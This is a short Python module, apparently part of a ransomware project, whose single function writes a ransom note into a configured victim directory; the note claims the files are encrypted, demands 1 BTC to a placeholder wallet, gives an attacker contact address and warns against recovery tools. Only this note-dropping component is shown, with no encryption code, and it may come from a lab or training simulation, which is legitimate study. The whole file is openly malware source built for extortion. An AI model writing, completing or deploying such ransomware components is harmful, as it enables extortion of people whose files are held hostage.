import os
from config import VICTIM_DIR, RANSOM_NOTE


def drop_note():
    """Drops a ransom note in victim directory."""
    note_path = os.path.join(VICTIM_DIR, RANSOM_NOTE)
    with open(note_path, "w") as f:
        f.write(
            "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n"
            "To restore your files, send 1 BTC to wallet address:\n"
            "   1FAKEbtcADDRESS12345\n\n"
            "Then contact: attacker@protonmail.com\n\n"
            "Do not try to tamper with files or use third-party tools.\n"
        )
    print(f"[+] Ransom note dropped at {note_path}")
